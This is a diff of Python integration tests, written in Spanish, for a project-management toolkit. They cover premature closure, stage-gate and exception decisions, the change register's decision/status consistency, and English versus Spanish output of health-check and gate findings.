+    r = py(ES, "--proyecto", g, "cierre", "--prematuro", "--decision", ds[-1]["id"] if ds else "D-001")
+    check("CP-02 cierre --prematuro en el pre-proyecto: rechazado (el proyecto no existe hasta autorizar la iniciación; corresponde autorizar-inicio rechazado), estado intacto",
+          r.returncode != 0 and "autorizar-inicio" in r.stderr and "rechazado" in r.stderr and est(g)["fase"] == "pre-proyecto" and "Traceback" not in r.stderr, det(r))
+    junta(g, "autorizar-inicio", d, arts=[("project-brief", "01-inicio/project-brief.md")])
+    py(ES, "--proyecto", g, "puerta", "autorizar-inicio", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-10-10")
+    r = py(ES, "--proyecto", g, "puerta", "autorizar-proyecto", "--decision", "rechazado", "--por", JUNTA, "--fecha", "2026-11-02")
+    e, ds = est(g), filas(g, "decisiones"); dp = ds[-1]["id"] if ds else ""
+    check("CP-03 autorizar-proyecto rechazado: sigue en inicio/IP sin proyecto_autorizado, puerta con su D-### (nivel junta, «autorizar-proyecto: rechazado»)",
+          r.returncode == 0 and (e["fase"], e["proceso_actual"]) == ("inicio", "IP") and not e.get("proyecto_autorizado")
+          and e["puertas"][-1]["decision"] == "rechazado" and e["puertas"][-1].get("decision_id") == dp and ds[-1]["decision"].startswith("autorizar-proyecto: rechazado")
+          and ds[-1]["nivel"] == "junta", det(r))
+    check("CP-04 autorizar-proyecto rechazado: el aviso indica el cierre prematuro con la decisión recién anotada (estado.py cierre --prematuro --decision D-###)",
+          "cierre --prematuro" in r.stdout and f"--decision {dp}" in r.stdout, det(r))
+    dg = py(RG, "--proyecto", g, "agregar", "decisiones", "--campo", "decision=Seguir con la iniciación", "--campo", "decidido_por=Gestor: Martín Suárez",
+            "--campo", "nivel=gestor").stdout.strip().splitlines()[-1]
+    rs = [py(ES, "--proyecto", g, "cierre", "--prematuro"), py(ES, "--proyecto", g, "cierre", "--prematuro", "--decision", "D-099"),
+          py(ES, "--proyecto", g, "cierre", "--prematuro", "--decision", dg), py(ES, "--proyecto", g, "cierre")]
+    check("CP-05 cierre --prematuro sin --decision, con un D-### inexistente o de nivel gestor: rechazado (decide la junta); cierre planificado desde la iniciación: rechazado; estado intacto",
+          all(x.returncode != 0 and "Traceback" not in x.stderr for x in rs) and all("junta" in x.stderr for x in rs[:3]) and "D-099" in rs[1].stderr
+          and est(g)["fase"] == "inicio", det(*rs))
+    r = py(ES, "--proyecto", g, "cierre", "--prematuro", "--decision", dp, "--fecha", "2026-11-03")
+    e = est(g); cp = e.get("cierre_prematuro") if isinstance(e.get("cierre_prematuro"), dict) else {}
+    check("CP-06 cierre --prematuro desde la iniciación con la decisión de la junta: cierre/CP y cierre_prematuro con fecha, decisión, motivo (el texto de la decisión), origen y etapa; «siguiente» pide el inventario",
+          r.returncode == 0 and (e["fase"], e["proceso_actual"]) == ("cierre", "CP") and cp.get("decision") == dp and cp.get("fecha") == "2026-11-03"
+          and cp.get("desde") == "inicio/IP" and cp.get("etapa") == 1 and "autorizar-proyecto: rechazado" in cp.get("motivo", "") and "inventario" in r.stdout, det(r))
+    s = san(g, "2026-11-03")
+    check("CP-07 sanidad: un cierre prematuro desde la iniciación no es «fase cierre sin autorizar-proyecto y autorizar-etapa» (sin EST-03)",
+          est(g)["fase"] == "cierre" and "EST-03" not in cods(s) and "EST-02" not in cods(s), str(sorted(cods(s, "ERROR"))))
+    pe = py(PU, "--proyecto", g, "estado", "--json"); pm = py(PU, "--proyecto", g, "estado", "--markdown")
+    try: pj = json.loads(pe.stdout)
+    except ValueError: pj = {}
+    prox = pj.get("proxima") or {}
+    check("CP-08 puertas.py estado: próxima puerta autorizar-cierre con C-08 (bloqueo: falta el inventario), el cierre prematuro con su decisión y, en Markdown, la línea «Cierre prematuro»",
+          prox.get("puerta") == "autorizar-cierre" and any(h["id"] == "C-08" and h["severidad"] == "bloqueo" for h in prox.get("hallazgos", []))
+          and (pj.get("cierre_prematuro") or {}).get("decision") == dp and "Cierre prematuro" in pm.stdout and dp in pm.stdout, det(pe, pm))
+    rd = radar(g, "2026-11-03"); r7 = [x for x in reglas(rd) if x["regla"] == "RAD-07"]
+    cx = py(ES, "--proyecto", g, "contexto", "--corte", "2026-11-03")
+    check("CP-09 radar: próxima puerta autorizar-cierre y RAD-07 con C-08 entre sus bloqueos; el contexto menciona el cierre prematuro y su decisión",
+          rd.get("proxima_puerta") == "autorizar-cierre" and r7 and "C-08" in r7[0]["que"] and "prematuro" in cx.stdout and dp in cx.stdout,
+          json.dumps(r7, ensure_ascii=False)[:300] + " | " + cx.stdout[-300:])
+    art(g, "inventario-cierre-prematuro", "04-cierre/inventario-cierre-prematuro.md")
+    py(PU, "--proyecto", g, "lista", "autorizar-cierre", "--fecha", "2026-11-05")
+    lista = "".join(open(x, encoding="utf-8").read() for x in glob.glob(os.path.join(d, g, "00-direccion", "decisiones", "*-verificacion-autorizar-cierre.md")))
+    check("CP-10 con el inventario registrado, C-08 desaparece; la lista de control de la junta suma el ítem del cierre prematuro (V-07: rescate, estado seguro, brechas elevadas)",
+          not hall(verif(g, "autorizar-cierre"), "C-08") and "V-07" in lista and "estado seguro" in lista, lista[-400:])
+
+    # --- 2 · entrega: excepción completa, pendiente, etapa rechazada y cierre prematuro desde SB
+    g = "ent"; nuevo(g)
+    py(ES, "--proyecto", g, "tolerancia", "--nivel", "proyecto", "tiempo=1mes", "costo=10%")
+    junta(g, "autorizar-inicio", d, arts=[("project-brief", "01-inicio/project-brief.md")])
+    py(ES, "--proyecto", g, "puerta", "autorizar-inicio", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-10-05")
+    junta(g, "autorizar-proyecto", d, arts=[("pid", "00-direccion/pid.md"), ("business-case", "00-direccion/business-case.md"), ("plan-proyecto", "02-planificacion/plan-proyecto.md")])
+    py(ES, "--proyecto", g, "puerta", "autorizar-proyecto", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-10-20")
+    junta(g, "autorizar-etapa", d, arts=[("plan-etapa-2", "02-planificacion/plan-etapa-2.md")])
+    py(ES, "--proyecto", g, "puerta", "autorizar-etapa", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-10-21", "--tol", "costo=5%", "tiempo=1sem")
+    pl = os.path.join(d, g, "02-planificacion")
+    open(os.path.join(pl, "requisitos.md"), "w", encoding="utf-8").write(
+        "# Requisitos\n\n| Id | Requisito | Interesado | Categoría | Prioridad | Estado |\n|---|---|---|---|---|---|\n| REQ-001 | Alta de socios | Ventas | funcional | Must | aprobado |\n")
+    open(os.path.join(pl, "wbs.csv"), "w", encoding="utf-8").write("codigo,nombre,tipo,responsable,esfuerzo_h,costo,ref\n1,Sistema,producto,Ana,,,\n1.1,Módulo de socios,paquete,Ana,100,5000,REQ-001\n")
+    q1 = py(RG, "--proyecto", g, "agregar", "calidad", "--campo", "producto=Revisión del producto 1.1 (socios)", "--campo", "fecha_prevista=2026-12-20").stdout.strip().splitlines()[-1]
+    e0 = est(g)
+    py(ES, "--proyecto", g, "limite-etapa", "--excepcion", "X-001")
+    n0 = len(filas(g, "decisiones"))
+    r = py(ES, "--proyecto", g, "puerta", "autorizar-plan-excepcion", "--decision", "rechazado", "--por", JUNTA, "--fecha", "2026-11-10")
+    e, ds = est(g), filas(g, "decisiones"); dx = ds[-1]["id"] if ds else ""
+    check("CP-11 plan de excepción rechazado: sigue en entrega/SB con la excepción X-001 abierta y la misma etapa, D-### anotada y el aviso de opciones (replanificar o cierre prematuro)",
+          r.returncode == 0 and (e["fase"], e["proceso_actual"]) == ("entrega", "SB") and e.get("excepcion_abierta") == "X-001"
+          and e["etapa_actual"] == e0["etapa_actual"] and len(ds) == n0 + 1 and ds[-1]["decision"].startswith("autorizar-plan-excepcion: rechazado")
+          and e["puertas"][-1].get("decision_id") == dx and "replanificación" in r.stdout and "cierre prematuro" in r.stdout, det(r))
+    shutil.copytree(os.path.join(d, g), os.path.join(d, "ent-x"))
+    junta(g, "autorizar-plan-excepcion", d, arts=[("plan-excepcion-X-001", "02-planificacion/plan-excepcion-X-001.md"),
+                                                  ("informe-excepcion-X-001", "03-control/reportes/informe-excepcion-X-001.md")])
+    r = py(ES, "--proyecto", g, "puerta", "autorizar-plan-excepcion", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-11-12", "--fin", "2027-01-15")
+    e = est(g); pe_ = [p for p in e["puertas"] if p["tipo"] == "autorizar-plan-excepcion"]
+    check("CP-12 excepción completa: rechazado y luego aprobado → entrega/CS, excepción cerrada, misma etapa con el fin nuevo, dos puertas con D-### distintas",
+          r.returncode == 0 and (e["fase"], e["proceso_actual"]) == ("entrega", "CS") and e.get("excepcion_abierta") == "" and e["etapa_actual"]["numero"] == 2
+          and e["etapa_actual"]["fin_previsto"] == "2027-01-15" and [p["decision"] for p in pe_] == ["rechazado", "aprobado"]
+          and len({p.get("decision_id") for p in pe_}) == 2 and all(p.get("decision_id") for p in pe_), det(r))
+    py(ES, "--proyecto", g, "limite-etapa")
+    n0 = len(filas(g, "decisiones"))
+    r = py(ES, "--proyecto", g, "puerta", "autorizar-etapa", "--decision", "pendiente", "--por", JUNTA, "--fecha", "2026-12-01")
+    e = est(g); s = san(g, "2026-12-01"); rd = radar(g, "2026-12-01")
+    check("CP-13 puerta pendiente: no cambia la fase ni la etapa ni escribe en decisiones.csv; sanidad EST-11 y radar «decidir» EST-11",
+          r.returncode == 0 and (e["fase"], e["proceso_actual"], e["etapa_actual"]["numero"]) == ("entrega", "SB", 2) and len(filas(g, "decisiones")) == n0
+          and e["puertas"][-1]["decision"] == "pendiente" and not e["puertas"][-1].get("decision_id") and "EST-11" in cods(s, "AVISO")
+          and any(x["regla"] == "EST-11" and x["id"] == "autorizar-etapa" for x in rd.get("items", {}).get("decidir", [])), det(r))
+    r = py(ES, "--proyecto", g, "puerta", "autorizar-etapa", "--decision", "rechazado", "--por", JUNTA, "--fecha", "2026-12-05")
+    e, ds = est(g), filas(g, "decisiones"); de = ds[-1]["id"] if ds else ""
+    pend = [p for p in e["puertas"] if p["decision"] == "pendiente"]
+    check("CP-14 autorizar-etapa rechazado: sigue en SB y en la etapa 2, D-### anotada, la pendiente queda resuelta con la fecha y EST-11 desaparece",
+          r.returncode == 0 and (e["fase"], e["proceso_actual"], e["etapa_actual"]["numero"]) == ("entrega", "SB", 2) and ds[-1]["decision"].startswith("autorizar-etapa: rechazado")
+          and e["puertas"][-1].get("decision_id") == de and pend and pend[0].get("resuelta") == "2026-12-05" and "EST-11" not in cods(san(g, "2026-12-05")), det(r))
+    shutil.copytree(os.path.join(d, g), os.path.join(d, "ent-plan"))
+    r = py(ES, "--proyecto", g, "cierre", "--prematuro", "--decision", de, "--fecha", "2026-12-06", "--motivo", "la junta no autoriza la etapa 3")
+    e = est(g); cp = e.get("cierre_prematuro") if isinstance(e.get("cierre_prematuro"), dict) else {}
+    v = verif(g, "autorizar-cierre"); c07 = hall(v, "C-07")
+    check("CP-15 cierre --prematuro desde entrega/SB: cierre_prematuro con la decisión y el motivo dados, origen entrega/SB y etapa 2",
+          r.returncode == 0 and (e["fase"], e["proceso_actual"]) == ("cierre", "CP") and cp.get("decision") == de and cp.get("motivo") == "la junta no autoriza la etapa 3"
+          and cp.get("desde") == "entrega/SB" and cp.get("etapa") == 2, det(r))
+    check("CP-16 autorizar-cierre con cierre prematuro: C-08 bloqueo (sin inventario), C-07 aviso (REQ-001 Must sin aceptar: transferirlo es legítimo), C-04 bloqueo (Q-001 abierta)",
+          sev(v, "C-08") == {"bloqueo"} and sev(v, "C-07") == {"aviso"} and c07 and "REQ-001" in c07[0]["mensaje"] and sev(v, "C-04") == {"bloqueo"}
+          and q1 in hall(v, "C-04")[0]["mensaje"], json.dumps([h for h in v.get("hallazgos", []) if h["id"].startswith("C-")], ensure_ascii=False)[:500])
+    py(ES, "--proyecto", "ent-plan", "cierre")
+    vp = verif("ent-plan", "autorizar-cierre")
+    check("CP-17 el mismo proyecto con cierre planificado: C-07 condición, C-04 bloqueo y sin C-08 (cierre_prematuro falso)",
+          sev(vp, "C-07") == {"condicion"} and sev(vp, "C-04") == {"bloqueo"} and not hall(vp, "C-08") and est("ent-plan").get("cierre_prematuro") is False,
+          json.dumps([h for h in vp.get("hallazgos", []) if h["id"].startswith("C-")], ensure_ascii=False)[:400])
+    art(g, "inventario-cierre-prematuro", "04-cierre/inventario-cierre-prematuro.md")
+    rq = py(RG, "--proyecto", g, "actualizar", "calidad", q1, "--campo", "estado=cancelada", "--campo", "notas=cancelada por el cierre prematuro")
+    v = verif(g, "autorizar-cierre")
+    check("CP-18 con el inventario C-08 desaparece; la revisión de calidad cancelada deja de ser abierta y C-04 desaparece (completar o cancelar); C-07 sigue como aviso",
+          rq.returncode == 0 and not hall(v, "C-08") and not hall(v, "C-04") and sev(v, "C-07") == {"aviso"} and "QUA-02" not in cods(san(g, "2027-01-10")),
+          json.dumps([h for h in v.get("hallazgos", []) if h["id"].startswith("C-")], ensure_ascii=False)[:400])
+    r = py(ES, "--proyecto", "ent-x", "cierre", "--prematuro", "--decision", dx, "--fecha", "2026-11-11")
+    e = est("ent-x"); s = san("ent-x", "2026-11-11"); rd = radar("ent-x", "2026-11-11")
+    check("CP-19 plan de excepción rechazado → cierre prematuro: la excepción X-001 queda en cierre_prematuro y deja de estar abierta (sin EST-14 en sanidad ni en el radar)",
+          r.returncode == 0 and e.get("excepcion_abierta") == "" and (e.get("cierre_prematuro") or {}).get("excepcion") == "X-001"
+          and "EST-14" not in cods(s) and not any(x["regla"] == "EST-14" for x in reglas(rd)), det(r))
+
+    # --- 3 · supuesto transferido (conducta existente: deja de ser abierto; su efecto lo lleva el riesgo que lo recibe)
+    g = "sup"; nuevo(g)
+    sid = py(RG, "--proyecto", g, "agregar", "supuestos", "--campo", "supuesto_o_restriccion=Los socios usan el canal web", "--campo", "tipo=supuesto",
+             "--campo", "criticidad=alta", "--campo", "certeza=baja").stdout.strip().splitlines()[-1]
+    a0 = (hall(verif(g, "autorizar-proyecto"), "P-11"), cods(san(g, "2026-10-02")))
+    rid = py(RG, "--proyecto", g, "agregar", "riesgos", "--campo", "evento=Baja adopción del canal web", "--campo", "tipo=amenaza", "--campo", "probabilidad=3",
+             "--campo", "impacto=4", "--campo", f"notas=origen {sid}").stdout.strip().splitlines()[-1]
+    r = py(RG, "--proyecto", g, "actualizar", "supuestos", sid, "--campo", "estado=transferido", "--campo", f"notas=→ {rid}")
+    cx = py(ES, "--proyecto", g, "contexto", "--corte", "2026-10-02")
+    check("CP-20 supuesto crítico transferido a un riesgo (notas → R-###): deja P-11 y SUP-01 (antes presentes) y el contexto no lo lista como crítico sin validar",
+          a0[0] and "SUP-01" in a0[1] and r.returncode == 0 and not hall(verif(g, "autorizar-proyecto"), "P-11") and "SUP-01" not in cods(san(g, "2026-10-02"))
+          and sid not in cx.stdout, det(r, cx))
+
+    # --- 4 · cambios: decision × estado contradictorios (registro.py), CAM-06 y presupuesto
+    g = "cam"; nuevo(g)
+    py(ES, "--proyecto", g, "presupuesto", "cambio=4000", "limite_autoridad_cambio=10000", "--por", "Ejecutiva: Laura Méndez")
+    AUT = "decidido_por=Autoridad de cambio: Sofía Ramírez"
+    def alta(*campos, forzar=False):
+        return py(RG, "--proyecto", g, "agregar", "cambios", *[x for c in campos for x in ("--campo", c)], *(["--forzar"] if forzar else []))
+    malas = [alta("titulo=A", "decision=aprobado", "estado=rechazado", AUT), alta("titulo=B", "decision=rechazado", "estado=implementado", AUT),
+             alta("titulo=C", "decision=diferido", "estado=aprobado", AUT, forzar=True), alta("titulo=D", "decision=pedir-mas-informacion", "estado=aprobado", AUT),
+             alta("titulo=E", "decision=approved", "estado=deferred", AUT)]
+    check("CP-21 altas contradictorias (aprobado×rechazado, rechazado×implementado, diferido×aprobado con --forzar, pedir-mas-informacion×aprobado, alias en inglés): "
+          "rechazadas con mensaje bilingüe que nombra la combinación, sin filas nuevas",
+          all(x.returncode != 0 and "Traceback" not in x.stderr and "contradic" in x.stderr for x in malas) and "--forzar" in malas[2].stderr
+          and "decision=aprobado" in malas[0].stderr and "estado=rechazado" in malas[0].stderr and not filas(g, "cambios"), det(*malas))
+    buenas = [alta("titulo=Diferido", "decision=diferido", "estado=diferido", AUT, "notas=reevaluar el 2027-02-01"),
+              alta("titulo=Rechazado y cerrado", "decision=rechazado", "estado=cerrado", AUT, "costo=3000", "cargo=presupuesto-cambio"),
+              alta("titulo=Pendiente", "estado=pendiente-decision", "costo=1000", "cargo=presupuesto-cambio"),
+              alta("titulo=Aprobado", "decision=aprobado", "estado=aprobado", AUT, "costo=500", "cargo=presupuesto-cambio")]
+    check("CP-22 combinaciones válidas aceptadas: diferido×diferido, rechazado×cerrado, sin decisión×pendiente-decision, aprobado×aprobado",
+          all(x.returncode == 0 for x in buenas) and [f["id"] for f in filas(g, "cambios")] == ["C-001", "C-002", "C-003", "C-004"], det(*buenas))
+    cdif, crc, cpen, _ = [x.stdout.strip().splitlines()[-1] if x.returncode == 0 and x.stdout.strip() else "C-000" for x in buenas]
+    antes = filas(g, "cambios")
+    us = [py(RG, "--proyecto", g, "actualizar", "cambios", cpen, "--campo", "decision=aprobado", "--campo", "estado=diferido", "--campo", AUT),
+          py(RG, "--proyecto", g, "actualizar", "cambios", cdif, "--campo", "decision=aprobado", "--forzar"),
+          py(RG, "--proyecto", g, "actualizar", "cambios", crc, "--campo", "estado=implementado"),
+          py(RG, "--proyecto", g, "proponer", "cambios", cpen, "--campo", "decision=rechazado", "--campo", "estado=aprobado", "--por", "agente: pm-control")]
+    check("CP-23 actualizaciones y propuestas que dejarían una contradicción (también con --forzar o tocando un solo campo): rechazadas, registro intacto y sin propuesta",
+          all(x.returncode != 0 and "contradic" in x.stderr for x in us) and filas(g, "cambios") == antes
+          and not (os.path.isdir(os.path.join(d, g, "03-control", "propuestas")) and os.listdir(os.path.join(d, g, "03-control", "propuestas"))), det(*us))
+    # datos ya existentes con la contradicción (escritos fuera de registro.py o con una versión anterior)
+    p_ = os.path.join(d, g, "03-control", "registros", "cambios.csv")
+    cols = list(csv.DictReader(open(p_, encoding="utf-8", newline="")).fieldnames)
+    cher = f"C-{max([int(f['id'][2:]) for f in filas(g, 'cambios')] or [0]) + 1:03d}"
+    with open(p_, "a", encoding="utf-8", newline="") as fh:
+        csv.DictWriter(fh, cols, lineterminator="\r\n").writerow({**{c: "" for c in cols}, "id": cher, "fecha": "2026-10-03", "titulo": "Heredado",
+                                                                    "decision": "aprobado", "estado": "diferido", "costo": "5000", "cargo": "presupuesto-cambio",
+                                                                    "decidido_por": "Ejecutiva: Laura Méndez"})
+    s = san(g, "2026-10-04"); c6 = [h for h in s.get("hallazgos", []) if h["codigo"] == "CAM-06"]
+    c3 = [h for h in s.get("hallazgos", []) if h["codigo"] == "CAM-03"]
+    check(f"CP-24 sanidad sobre un CSV con la contradicción ya existente: CAM-06 AVISO solo para {cher}; ese diferido y el rechazado y cerrado ({crc}) no consumen: CAM-03 = 500 de 4.000",
+          len(c6) == 1 and c6[0]["severidad"] == "AVISO" and cher in c6[0]["mensaje"] and len(c3) == 1 and c3[0]["severidad"] == "INFO" and "500 de 4.000" in c3[0]["mensaje"],
+          json.dumps([h for h in s.get("hallazgos", []) if h["codigo"].startswith("CAM")], ensure_ascii=False)[:500])
+    rn = py(RG, "--proyecto", g, "actualizar", "cambios", cher, "--campo", "notas=revisar con la junta")
+    ra = py(RG, "--proyecto", g, "actualizar", "cambios", cpen, "--campo", "decision=aprobado", "--campo", "estado=aprobado", "--campo", AUT, "--campo", "costo=3400")
+    check("CP-25 la fila heredada admite cambios en otras columnas (notas); el saldo del presupuesto no cuenta lo rechazado ni lo diferido: la autoridad aprueba 3.400 (500 + 3.400 ≤ 4.000)",
+          rn.returncode == 0 and ra.returncode == 0 and {f["id"]: f for f in filas(g, "cambios")}.get(cpen, {}).get("estado") == "aprobado", det(rn, ra))
+
+
+def caso_correcciones_263(tmp):
+    """C3: correcciones 2.6.3 (docs/PRUEBAS.md, fila C3). (1) Hallazgos de sanidad y de puertas en el idioma del proyecto:
+    el mismo recorrido en español y en inglés da los mismos códigos, ids, severidades y estructura JSON, con los mensajes,
+    la lista de control de la junta, el texto de verificar y las notas de la decisión en inglés, y el español sin cambios.
+    (2) Plan de excepción durante un cierre prematuro sin salir de CP: autorizar-plan-excepcion con X-01, D-### de la junta,
+    plan asociado al cierre y C-09 en autorizar-cierre hasta completarlo o cerrarlo; fuera del cierre prematuro, sin
+    cambios. (3) Supuesto transferido sin destino o con destino inexistente rechazado (también con --forzar y en
+    propuestas) y SUP-04 para los datos ya existentes."""
+    print("\n== C3 · correcciones 2.6.3: idioma de los hallazgos, plan de excepción en el cierre prematuro y supuesto transferido")
+    import importlib.util
+    d = os.path.join(tmp, "c3"); os.makedirs(d)
+    ES, RG, SA, NP = (os.path.join(S, x) for x in ("estado.py", "registro.py", "sanidad.py", "nuevo_proyecto.py"))
+    GD = os.path.join(RAIZ, "hooks", "guardian.py")
+    spec = importlib.util.spec_from_file_location("pm_idioma_hook_c3", os.path.join(RAIZ, "hooks", "idioma.py"))
+    IDH = importlib.util.module_from_spec(spec); spec.loader.exec_module(IDH)
+    sin_citas = lambda s_: re.sub(r"«[^»]*»|`[^`]*`|\S+-\S+", "", s_)      # sin datos citados, código ni ids (informe-fin-proyecto)
+    def py(script, *args, entrada=None):
+        return subprocess.run([sys.executable, script] + list(args), cwd=d, capture_output=True, text=True, encoding="utf-8", errors="replace", input=entrada)
+    def est(g): return json.load(open(os.path.join(d, g, "estado.json"), encoding="utf-8"))
+    def filas(g, reg):
+        q = os.path.join(d, g, "03-control", "registros", f"{reg}.csv")
+        return list(csv.DictReader(open(q, encoding="utf-8", newline=""))) if os.path.exists(q) else []
+    def js(r):
+        try: return json.loads(r.stdout)
+        except ValueError: return {}
+    def ultimo_id(r): return (r.stdout.strip().splitlines() or [""])[-1]
+    det = lambda *rs: " || ".join(f"rc={r.returncode} {(r.stdout + r.stderr)[-300:]!r}" for r in rs)
+    JUNTA = "Junta: Laura Méndez (ejecutiva)"
+
+    # --- 1 · el mismo recorrido en español y en inglés
+    def preparar(g, idioma):
+        py(NP, "--ruta", g, "--nombre", "Portal", "--idioma", idioma, "--fecha", "2026-10-01", "--ejecutivo", "Laura Méndez", "--gestor", "Martín Suárez")
+        py(RG, "--proyecto", g, "agregar", "supuestos", "--campo", "supuesto_o_restriccion=Los socios usan el canal web", "--campo", "tipo=supuesto", "--campo", "criticidad=alta", "--campo", "certeza=baja")
+        py(RG, "--proyecto", g, "agregar", "riesgos", "--campo", "evento=Proveedor sin capacidad", "--campo", "tipo=amenaza", "--campo", "probabilidad=5", "--campo", "impacto=4")
+        py(RG, "--proyecto", g, "agregar", "acciones", "--campo", "descripcion=Revisar el contrato", "--campo", "responsable=Martín Suárez", "--campo", "fecha_compromiso=2026-10-05")
+    for g_, i_ in (("es1", "es"), ("en1", "en")): preparar(g_, i_)
+    se, sn = js(py(SA, "--proyecto", "es1", "--json", "--corte", "2026-10-10")), js(py(SA, "--proyecto", "en1", "--json", "--corte", "2026-10-10"))
+    clave = lambda s_: sorted((h["severidad"], h["codigo"]) for h in s_.get("hallazgos", []))
+    estructura = lambda s_: (sorted(s_), sorted(s_.get("cuenta", {}).items()), [sorted(h) for h in s_.get("hallazgos", [])])
+    check("C3-01 sanidad --json en inglés: mismos códigos y severidades que en español, mismas claves del JSON y mismos conteos",
+          se.get("hallazgos") and clave(se) == clave(sn) and estructura(se) == estructura(sn), f"{clave(se)} | {clave(sn)}")
+    msg = lambda s_, c: [h for h in s_.get("hallazgos", []) if h["codigo"] == c]
+    es_en = [h["codigo"] for h in sn.get("hallazgos", []) if IDH.idioma_de(sin_citas(h["mensaje"] + " " + h["arreglo"])) == "es"]
+    check("C3-02 sanidad en inglés: mensaje y corrección de cada hallazgo en inglés (SUP-01 «Critical assumption», REG-06 «High risk», REG-07 «Overdue action»); ninguno se lee como español",
+          not es_en and msg(sn, "SUP-01") and msg(sn, "SUP-01")[0]["mensaje"].startswith("Critical assumption S-001 without an experiment")
+          and msg(sn, "REG-06") and msg(sn, "REG-06")[0]["mensaje"] == "High risk R-001 without a response or owner."
+          and msg(sn, "REG-07") and msg(sn, "REG-07")[0]["mensaje"].startswith("Overdue action A-001"), es_en or json.dumps(sn.get("hallazgos", []), ensure_ascii=False)[:500])
+    check("C3-03 sanidad en español sin cambios: los mismos textos de siempre (SUP-01, REG-06 y su corrección)",
+          msg(se, "SUP-01") and msg(se, "SUP-01")[0]["mensaje"] == "Supuesto crítico S-001 sin experimento para validarlo: «Los socios usan el canal web»."
+          and msg(se, "REG-06") and msg(se, "REG-06")[0]["mensaje"] == "Riesgo alto R-001 sin respuesta o propietario." and msg(se, "REG-06")[0]["arreglo"] == "pm-riesgos.",
+          json.dumps(se.get("hallazgos", []), ensure_ascii=False)[:400])
+    st = py(SA, "--proyecto", "en1", "--corte", "2026-10-10")
+    lineas_es = [l for l in st.stdout.splitlines() if IDH.idioma_de(sin_citas(l)) == "es"]
+    check("C3-04 sanidad (texto) en inglés: encabezado «Health check of» y ninguna línea en español; los códigos y las severidades no cambian",
+          st.stdout.startswith("Health check of 'Portal'") and not lineas_es and "AVISO SUP-01" in st.stdout, lineas_es[:3] or st.stdout[:300])
+    # puertas: verificar (JSON y texto) y la lista de control de la junta
+    ve, vn = js(py(PU, "--proyecto", "es1", "verificar", "autorizar-inicio", "--json")), js(py(PU, "--proyecto", "en1", "verificar", "autorizar-inicio", "--json"))
+    ids_ = lambda v: [(h["severidad"], h["id"]) for h in v.get("hallazgos", [])]
+    check("C3-05 puertas.py verificar --json en inglés: mismas claves, ids y severidades que en español; I-01 «the project brief is missing», L-01 en inglés",
+          vn.get("hallazgos") and sorted(ve) == sorted(vn) and ids_(ve) == ids_(vn) and [sorted(h) for h in ve["hallazgos"]] == [sorted(h) for h in vn["hallazgos"]]
+          and any(h["id"] == "I-01" and h["mensaje"] == "the project brief is missing (pm-mandato-y-brief)" for h in vn["hallazgos"])
+          and any(h["id"] == "I-01" and h["mensaje"] == "falta el project brief (pm-mandato-y-brief)" for h in ve["hallazgos"])
+          and not [h for h in vn["hallazgos"] if IDH.idioma_de(h["mensaje"]) == "es"], json.dumps(vn, ensure_ascii=False)[:400])
+    pt = py(PU, "--proyecto", "en1", "verificar", "autorizar-inicio")
+    check("C3-06 puertas.py verificar (texto) en inglés: «Gate autorizar-inicio: … blocker(s)», etiquetas BLOCKER/condition y la línea final en inglés",
+          pt.stdout.startswith("Gate autorizar-inicio: 2 blocker(s) · 1 condition(s) · 0 warning(s)") and "BLOCKER   I-01" in pt.stdout
+          and "'aprobado' is not recorded" in pt.stdout and not [l for l in pt.stdout.splitlines() if IDH.idioma_de(l) == "es"], pt.stdout[:400])
+    for g_ in ("es1", "en1"): junta(g_, "autorizar-inicio", d, arts=[("project-brief", "01-inicio/project-brief.md")], por=JUNTA)
+    lis = {g_: "".join(open(x, encoding="utf-8").read() for x in glob.glob(os.path.join(d, g_, "00-direccion", "decisiones", "*-verificacion-autorizar-inicio.md"))) for g_ in ("es1", "en1")}
+    check("C3-07 lista de control de la junta en inglés (encabezados, tabla e ítems V-01…V-05) y en español con los textos de siempre; confirmar funciona en ambas",
+          "## 3. Board checklist" in lis["en1"] and "- [x] V-01 The mandate and the project brief describe" in lis["en1"] and "Confirmed by " in lis["en1"]
+          and "Lista de control" not in lis["en1"] and "## 3. Lista de control de la junta · Board checklist" in lis["es1"]
+          and "- [x] V-01 El mandato y el project brief describen" in lis["es1"] and "Confirmada por " in lis["es1"]
+          and not [l for l in lis["en1"].splitlines() if IDH.idioma_de(l) == "es"], lis["en1"][-500:])
+    for g_ in ("es1", "en1"):
+        py(ES, "--proyecto", g_, "puerta", "autorizar-inicio", "--decision", "condicionado", "--por", JUNTA, "--fecha", "2026-10-05", "--condiciones", "completar la junta")
+    dn, de_ = filas("en1", "decisiones")[-1:], filas("es1", "decisiones")[-1:]
+    check("C3-08 decisión de la puerta en decisiones.csv: etiquetas en inglés en el proyecto en inglés («— conditions:», «gate:»), en español sin cambios («— condiciones:», «puerta:»)",
+          dn and de_ and dn[0]["decision"] == "autorizar-inicio: condicionado — conditions: completar la junta; no initiation stage plan (plan-etapa-1)"
+          and dn[0]["notas"].startswith("gate: autorizar-inicio; verification: ") and "; observations: no initiation stage plan" in dn[0]["notas"]
+          and de_[0]["decision"] == "autorizar-inicio: condicionado — condiciones: completar la junta; sin plan de la etapa de iniciación (plan-etapa-1)"
+          and de_[0]["notas"].startswith("puerta: autorizar-inicio; verificación: ") and "; observaciones: sin plan de la etapa de iniciación" in de_[0]["notas"],
+          json.dumps(dn + de_, ensure_ascii=False)[:400])
+    vp = js(py(PU, "--proyecto", "en1", "verificar", "autorizar-proyecto", "--json"))
+    g01 = [h for h in vp.get("hallazgos", []) if h["id"] == "G-01"]
+    junta("en1", "autorizar-proyecto", d, arts=[("pid", "00-direccion/pid.md"), ("business-case", "00-direccion/business-case.md")], por=JUNTA)
+    py(ES, "--proyecto", "en1", "tolerancia", "--nivel", "proyecto", "tiempo=1mes", "costo=10%")
+    rp = py(ES, "--proyecto", "en1", "puerta", "autorizar-proyecto", "--decision", "condicionado", "--por", JUNTA, "--fecha", "2026-10-20")
+    pp = (est("en1")["puertas"] or [{}])[-1]
+    check("C3-09 G-01 en inglés («open conditions from earlier gates: …»), P-11 en inglés, y la G-01 en inglés no se copia como condición nueva de autorizar-proyecto (como en español)",
+          g01 and g01[0]["mensaje"].startswith("open conditions from earlier gates: autorizar-inicio 2026-10-05")
+          and any(h["id"] == "P-11" and h["mensaje"].startswith("unvalidated critical assumptions: S-001") for h in vp.get("hallazgos", []))
